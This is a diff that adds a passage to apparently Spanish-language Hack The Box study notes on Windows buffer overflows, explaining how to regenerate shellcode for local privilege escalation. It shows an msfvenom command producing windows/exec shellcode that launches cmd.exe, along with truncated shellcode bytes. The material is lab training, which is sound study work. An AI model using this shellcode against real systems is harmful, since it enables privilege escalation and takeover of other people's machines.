@@ -466,6 +466,20 @@ exploit()
 
 ### Obtener ejecución de código
 
+Lo que tenemos que hacer es cambiar nuestro shellcode para hacer otra cosa. Para la escalada de privilegios locales, podemos usar el mismo comando que usamos para `calc.exe`, pero `CMD=cmd.exe`en su lugar, use lo siguiente:
+
+  Saltar a Shellcode
+
+```shell-session
+0xRh4ps00dy@htb[/htb]$ msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'
+
+...SNIP...
+buf =  b""
+buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
+buf += b"\xc9\xb1\x31\x83\xed\xfc\x31\x45\x13\x03\x39\x8c\x6e"
+...SNIP...
+```
+
 
 # Remote Buffer Overflow
 
